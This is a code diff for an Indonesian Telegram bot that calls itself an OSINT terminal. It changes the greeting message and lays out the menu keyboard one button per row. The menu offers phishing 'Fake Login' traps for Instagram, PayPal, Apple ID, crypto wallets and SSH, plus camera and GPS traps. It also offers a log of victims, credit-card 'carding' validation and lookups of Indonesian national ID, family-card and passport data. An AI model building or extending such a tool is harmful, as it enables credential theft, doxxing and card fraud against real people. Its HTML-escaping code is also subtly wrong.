@@ -1573,42 +1573,99 @@ There are no background services or permissions associated.
         saveAgreement();
         ctx.answerCbQuery("System verified!").catch(() => {});
         ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
-        const startMsgText = getStartMsg();
+        const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+        const startMsgText = getStartMsg(safeName);
         ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainReplyKeyboard });
     });
 
-    const getStartMsg = () => `<b>${botDescription}</b>\n\n` +
-                         `<i>Silakan pilih menu di bawah ini:</i>`;
+    const getStartMsg = (name: string) => {
+        const hour = new Date().getHours();
+        let greeting = 'malam';
+        if (hour >= 4 && hour < 11) greeting = 'pagi';
+        else if (hour >= 11 && hour < 15) greeting = 'siang';
+        else if (hour >= 15 && hour < 18) greeting = 'sore';
+
+        return `👋 Selamat ${greeting}, <b>${name}</b>! 🚀\n\n` +
+               `⚠️ <b>P E N G G U N A A N  B O T</b> ⚠️\n` +
+               `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+               `<blockquote>` +
+               `🔒 Larangan keras penyalahgunaan sistem\n` +
+               `⚖️ Admin tidak bertanggung jawab atas kerugian\n` +
+               `📜 Wajib mematuhi peraturan perundang-undangan` +
+               `</blockquote>\n\n` +
+               `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+               `© TRIHEXA OSINT - Hak Cipta Dilindungi`;
+    };
     
     const mainReplyKeyboard = Markup.keyboard([
-      ['🔒 TRIHEXA OSINT TERMINAL 🔒'],
+      ['🔒 AKSES STANDAR 🔒'],
       ['── 🇮🇩 OSINT INDONESIA ──'],
-      ['🆔 Cek NIK', '🖨️ Cek KK', '🏥 Cek BPJS'],
-      ['🚗 Cek Plat Nopol', '👨‍💼 Cek NIP/ASN', '🏢 Cek NIB Bisnis'],
-      ['🎓 Cek SIVIL Ijazah', '⚖️ Putusan Mahkamah', '🏛️ Cek Pajak PBB'],
-      ['🚔 Cek DPO Polri', '🛂 Cek Paspor', '🛑 Cekal Imigrasi'],
-      ['🗳️ Cek DPT KPU', '📜 Cek Sertipikat BPN', '📦 Cek Bea Cukai'],
-      ['🏦 Cek OJK Hukum', '💼 Cek Perusahaan AHU', '💍 Cek Buku Nikah'],
-      ['── 🕵️ GLOBAL OSINT & TRACKING ──'],
-      ['🧠 Intelligence Correlator', '🌐 IP Geolocation Tracker', '📡 Reverse IP Lookup'],
-      ['🔎 WHOIS Domain', '🌍 DNS Records Lookup', '🕸️ Subdomain Scanner', '🕷️ Shodan Dorking'],
-      ['📧 Email Validator & Leak', '👤 Sosmed & Username Tracker', '📞 Phone Tracker (HLR)'],
-      ['💻 MAC Address OSINT', '🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
+      ['🆔 Cek NIK'],
+      ['🖨️ Cek KK'],
+      ['🏥 Cek BPJS'],
+      ['🚗 Cek Plat Nopol'],
+      ['👨‍💼 Cek NIP/ASN'],
+      ['🏢 Cek NIB Bisnis'],
+      ['🎓 Cek SIVIL Ijazah'],
+      ['⚖️ Putusan Mahkamah'],
+      ['🏛️ Cek Pajak PBB'],
+      ['🚔 Cek DPO Polri'],
+      ['🛂 Cek Paspor'],
+      ['🛑 Cekal Imigrasi'],
+      ['🗳️ Cek DPT KPU'],
+      ['📜 Cek Sertipikat BPN'],
+      ['📦 Cek Bea Cukai'],
+      ['🏦 Cek OJK Hukum'],
+      ['💼 Cek Perusahaan AHU'],
+      ['💍 Cek Buku Nikah'],
+      ['── 🕵️ GLOBAL OSINT ──'],
+      ['🧠 Intelligence Correlator'],
+      ['🌐 IP Geolocation Tracker'],
+      ['📡 Reverse IP Lookup'],
+      ['🔎 WHOIS Domain'],
+      ['🌍 DNS Records Lookup'],
+      ['🕸️ Subdomain Scanner'],
+      ['🕷️ Shodan Dorking'],
+      ['📧 Email Validator & Leak'],
+      ['👤 Sosmed & Username Tracker'],
+      ['📞 Phone Tracker (HLR)'],
+      ['💻 MAC Address OSINT'],
+      ['🚀 Port Scanner'],
+      ['🚨 CVE Exploit Lookup'],
       ['── 🛑 TRAP & LOGGER ──'],
-      ['📸 Request Camera Trap', '📍 Request GPS Trap'],
-      ['🎣 Fake Login IG/Meta', '💬 Fake Login FB/Messenger', '💼 Fake Login LinkedIn'],
-      ['💰 Fake Login Crypto/Wallet', '💳 Fake Login PayPal', '🛒 Fake Login Amazon/Toko'],
-      ['🎮 Fake Login Steam', '🍎 Fake Login AppleID', '🐧 Fake Login Linux/SSH'],
-      ['🎵 Fake Login Spotify/Netflix', '📁 Fake Login GDrive/Dropbox', '🛡️ Trap Bypass Cloudflare'],
-      ['📊 Lihat Log Korban (Logger)', '⚙️ Set Custom Domain Tracker'],
+      ['📸 Request Camera Trap'],
+      ['📍 Request GPS Trap'],
+      ['🎣 Fake Login IG/Meta'],
+      ['💬 Fake Login FB/Messenger'],
+      ['💼 Fake Login LinkedIn'],
+      ['💰 Fake Login Crypto/Wallet'],
+      ['💳 Fake Login PayPal'],
+      ['🛒 Fake Login Amazon/Toko'],
+      ['🎮 Fake Login Steam'],
+      ['🍎 Fake Login AppleID'],
+      ['🐧 Fake Login Linux/SSH'],
+      ['🎵 Fake Login Spotify/Netflix'],
+      ['📁 Fake Login GDrive/Dropbox'],
+      ['🛡️ Trap Bypass Cloudflare'],
+      ['📊 Lihat Log Korban (Logger)'],
+      ['⚙️ Set Custom Domain Tracker'],
       ['── 🛠️ ADVANCED CYBER TOOLS ──'],
-      ['🔐 Hash Generator (MD5/SHA)', '🔓 Base64 Encode/Decode', '💳 Cek Info BIN Card'],
-      ['💳 Validasi CC (Carding)', '🧪 XSS Scanner', '🦠 VirusTotal Web/File Scan'],
+      ['🔐 Hash Generator (MD5/SHA)'],
+      ['🔓 Base64 Encode/Decode'],
+      ['💳 Cek Info BIN Card'],
+      ['💳 Validasi CC (Carding)'],
+      ['🧪 XSS Scanner'],
+      ['🦠 VirusTotal Web/File Scan'],
       ['── 🧩 UTILITAS & MEDIA ──'],
-      ['🎵 Download Lagu/Audio', '🎥 Download Video (IG/TikTok)', '🌤️ Info Cuaca Area'],
-      ['⏰ Sistem Alarm Pengingat', '📈 Info Harga Crypto (Live)', '📲 Koneksi Bot WhatsApp'],
+      ['🎵 Download Lagu/Audio'],
+      ['🎥 Download Video (IG/TikTok)'],
+      ['🌤️ Info Cuaca Area'],
+      ['⏰ Sistem Alarm Pengingat'],
+      ['📈 Info Harga Crypto (Live)'],
+      ['📲 Koneksi Bot WhatsApp'],
       ['── 💀 PRO FITUR ──'],
-      ['💀 SANTO PETRUS (TAKEDOWN)', 'ℹ️ Informasi Bot & Bantuan']
+      ['💀 SANTO PETRUS (TAKEDOWN)'],
+      ['ℹ️ Informasi Bot & Bantuan']
     ]).resize();
 
     // Global Error Handler for "Anti Bug"
@@ -1708,15 +1765,14 @@ There are no background services or permissions associated.
     bot.start(async (ctx) => {
         await ctx.reply("🔄 <b>Inisialisasi Terminal...</b>\nUpdate UI Keyboard berhasil dimuat.", { parse_mode: 'HTML', ...mainReplyKeyboard });
         const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
-        const txt = `${getStartMsg()}\n<i>Session Active for: ${safeName}</i>`;
+        const txt = getStartMsg(safeName);
         await ctx.reply(txt, { parse_mode: 'HTML' });
     });
 
     bot.action('menu_main', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
       const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
-      const txt = `${getStartMsg()}\n` +
-        `<i>Session Active for: ${safeName}</i>`;
+      const txt = getStartMsg(safeName);
       ctx.editMessageText(txt, { parse_mode: 'HTML' }).catch(() => {});
     });
 
@@ -4446,9 +4502,9 @@ There are no background services or permissions associated.
     // 📸 IMAGE OSINT MODULE (Reverse Image / Data)
     // 🗂️ BUTTON REPLIES MAPPING
     const buttonMap: Record<string, string> = {
-       '🔒 TRIHEXA OSINT TERMINAL 🔒': '<b>🔒 TRIHEXA OSINT TERMINAL</b>\nSistem aktif. Pilih menu pada keyboard.',
+       '🔒 AKSES STANDAR 🔒': '<b>🔒 AKSES STANDAR TERMINAL</b>\nSistem aktif. Pilih menu pada keyboard.',
        '── 🇮🇩 OSINT INDONESIA ──': '<b>🇮🇩 PUSAT KONTROL OSINT INDONESIA</b>\nPilih layanan pencarian data dari tombol di bawah.',
-       '── 🕵️ GLOBAL OSINT & TRACKING ──': '<b>🕵️ GLOBAL OSINT & TRACKING</b>\nPilih layanan pelacakan digital dari tombol di bawah.',
+       '── 🕵️ GLOBAL OSINT ──': '<b>🕵️ GLOBAL OSINT & TRACKING</b>\nPilih layanan pelacakan digital dari tombol di bawah.',
        '── 🛑 TRAP & LOGGER ──': '<b>🛑 TRAP LOGGER</b>\nPilih modul logging dari tombol di bawah.',
        '── 🛠️ ADVANCED CYBER TOOLS ──': '<b>🛠️ ADVANCED CYBER TOOLS</b>\nPilih alat siber tingkat lanjut dari tombol di bawah.',
        '── 🧩 UTILITAS & MEDIA ──': '<b>🧩 UTILITAS & MEDIA</b>\nPilih alat hiburan dan utilitas dari tombol di bawah.',
